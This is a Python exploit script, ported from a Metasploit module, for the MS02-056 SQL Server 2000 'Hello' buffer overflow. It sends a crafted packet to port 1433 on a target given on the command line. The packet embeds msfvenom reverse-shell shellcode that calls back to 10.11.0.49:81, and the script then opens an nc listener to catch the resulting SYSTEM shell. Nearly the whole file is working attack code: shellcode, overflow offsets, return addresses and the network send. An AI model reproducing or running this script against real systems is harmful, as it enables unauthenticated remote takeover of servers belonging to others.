#!/usr/bin/python

# 
# Ported from Metasploit.
# Author of port: Artur Szymczak - IBM X-Force Red
#
#       Name: MS02-056 Microsoft SQL Server Hello Overflow
#     Module: exploit/windows/mssql/ms02_056_hello
#   Platform: Windows
#       Arch: 
# Privileged: Yes
#    License: Metasploit Framework License (BSD)
#       Rank: Good
#  Disclosed: 2002-08-05
#
# Provided by:
#   MC <mc@metasploit.com>
#
# Available targets:
#   Id  Name
#   --  ----
#   0   MSSQL 2000 / MSDE <= SP2
# Description:
#   By sending malformed data to TCP port 1433, an unauthenticated 
#   remote attacker could overflow a buffer and possibly execute code on 
#   the server with SYSTEM level privileges. This module should work 
#   against any vulnerable SQL Server 2000 or MSDE install (< SP3).
# 
# References:
#   https://cvedetails.com/cve/CVE-2002-1123/
#   OSVDB (10132)
#   http://www.securityfocus.com/bid/5411
#   https://technet.microsoft.com/en-us/library/security/MS02-056

import socket
import struct
import os
import sys

if len (sys.argv) != 3 :
  print "Usage: python %s IP PORT" % sys.argv[0]
  sys.exit (1)

# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.49 LPORT=81 -b "\x00" -f python -v shellcode
shellcode =  ""
shellcode += "\xdb\xde\xd9\x74\x24\xf4\x5e\x33\xc9\xb8\x35\xc9"
shellcode += "\xe7\x23\xb1\x52\x31\x46\x17\x03\x46\x17\x83\xdb"
shellcode += "\x35\x05\xd6\xdf\x2e\x48\x19\x1f\xaf\x2d\x93\xfa"
shellcode += "\x9e\x6d\xc7\x8f\xb1\x5d\x83\xdd\x3d\x15\xc1\xf5"
shellcode += "\xb6\x5b\xce\xfa\x7f\xd1\x28\x35\x7f\x4a\x08\x54"
shellcode += "\x03\x91\x5d\xb6\x3a\x5a\x90\xb7\x7b\x87\x59\xe5"
shellcode += "\xd4\xc3\xcc\x19\x50\x99\xcc\x92\x2a\x0f\x55\x47"
shellcode += "\xfa\x2e\x74\xd6\x70\x69\x56\xd9\x55\x01\xdf\xc1"
shellcode += "\xba\x2c\xa9\x7a\x08\xda\x28\xaa\x40\x23\x86\x93"
shellcode += "\x6c\xd6\xd6\xd4\x4b\x09\xad\x2c\xa8\xb4\xb6\xeb"
shellcode += "\xd2\x62\x32\xef\x75\xe0\xe4\xcb\x84\x25\x72\x98"
shellcode += "\x8b\x82\xf0\xc6\x8f\x15\xd4\x7d\xab\x9e\xdb\x51"
shellcode += "\x3d\xe4\xff\x75\x65\xbe\x9e\x2c\xc3\x11\x9e\x2e"
shellcode += "\xac\xce\x3a\x25\x41\x1a\x37\x64\x0e\xef\x7a\x96"
shellcode += "\xce\x67\x0c\xe5\xfc\x28\xa6\x61\x4d\xa0\x60\x76"
shellcode += "\xb2\x9b\xd5\xe8\x4d\x24\x26\x21\x8a\x70\x76\x59"
shellcode += "\x3b\xf9\x1d\x99\xc4\x2c\xb1\xc9\x6a\x9f\x72\xb9"
shellcode += "\xca\x4f\x1b\xd3\xc4\xb0\x3b\xdc\x0e\xd9\xd6\x27"
shellcode += "\xd9\xec\x2d\x27\x28\x99\x33\x27\x4a\x08\xbd\xc1"
shellcode += "\x20\xba\xeb\x5a\xdd\x23\xb6\x10\x7c\xab\x6c\x5d"
shellcode += "\xbe\x27\x83\xa2\x71\xc0\xee\xb0\xe6\x20\xa5\xea"
shellcode += "\xa1\x3f\x13\x82\x2e\xad\xf8\x52\x38\xce\x56\x05"
shellcode += "\x6d\x20\xaf\xc3\x83\x1b\x19\xf1\x59\xfd\x62\xb1"
shellcode += "\x85\x3e\x6c\x38\x4b\x7a\x4a\x2a\x95\x83\xd6\x1e"
shellcode += "\x49\xd2\x80\xc8\x2f\x8c\x62\xa2\xf9\x63\x2d\x22"
shellcode += "\x7f\x48\xee\x34\x80\x85\x98\xd8\x31\x70\xdd\xe7"
shellcode += "\xfe\x14\xe9\x90\xe2\x84\x16\x4b\xa7\xb5\x5c\xd1"
shellcode += "\x8e\x5d\x39\x80\x92\x03\xba\x7f\xd0\x3d\x39\x75"
shellcode += "\xa9\xb9\x21\xfc\xac\x86\xe5\xed\xdc\x97\x83\x11"
shellcode += "\x72\x97\x81"

payload  = "\x12\x01\x00\x34\x00\x00\x00\x00\x00\x00\x15\x00\x06\x01\x00\x1b\x00\x01\x02\x00\x1c\x00\x0c\x03\x00\x28\x00\x04\xff\x08\x00\x02\x10\x00\x00\x00"
payload += "A" * 528 + "\x1B\xA5\xEE\x34" + "AAAA" + struct.pack("<L", 0x42b68aba) + struct.pack("<L", 0x42d01e50) + struct.pack("<L", 0x42d01e50)
payload += "3333" + struct.pack("<L", 0x42d01e50) + struct.pack("<L", 0x42d01e50) + "A" * 88 + shellcode + "\x00\x24\x01\x00\x00"


try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((sys.argv[1], int(sys.argv[2])))
  s.send(payload)
  os.system("nc -vnlp 81")
except:
  print "failed"
